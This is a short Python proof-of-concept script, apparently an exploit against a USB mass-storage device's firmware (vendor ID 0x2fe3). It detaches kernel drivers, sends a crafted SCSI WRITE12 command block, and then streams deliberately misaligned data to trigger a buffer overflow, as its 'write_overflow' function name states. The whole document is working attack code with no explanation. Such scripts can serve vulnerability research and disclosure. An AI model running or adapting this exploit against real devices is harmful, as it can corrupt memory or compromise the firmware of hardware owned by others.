#!/usr/bin/python3
import usb.core
import struct
import time

def p32(x):
    return struct.pack("<I", x)

def p32b(x):
    return struct.pack(">I", x)

def p8(x):
    return struct.pack("<B", x)

def write_overflow(dev):
    addr = 0x0
    length = 0x400

    assert addr % 512 == 0
    assert length % 512 == 0

    # WRITE12 (0xAA)
    cb = p8(0xAA) + p8(0) + p32b(addr // 512) + p32b(length // 512)
    cbw = b"USBC" + p32(0x11223344) + p32(length) + p8(0) + p8(0) + \
        p8(len(cb)) + cb
    cbw += b"\x00" * (31 - len(cbw))
    dev.write(0x01, cbw)

    # write 0x1FF bytes, so that the address is unaligned as the result
    dev.write(0x01, b"\x00" * 511)
    time.sleep(0.1)
    dev.write(0x01, b"\x42" * 64)
    time.sleep(0.1)
    dev.write(0x01, b"\x00" * (length - 511 - 64))

    dev.read(0x81, 0x40)

def main():
    dev = usb.core.find(idVendor=0x2fe3, idProduct=0x0100)
    for cfg in dev:
        for intf in cfg:
            if dev.is_kernel_driver_active(intf.bInterfaceNumber):
                try:
                    dev.detach_kernel_driver(intf.bInterfaceNumber)
                except usb.core.USBError as e:
                    raise RuntimeError("detach_kernel_driver")
    write_overflow(dev)

if __name__ == "__main__":
    main()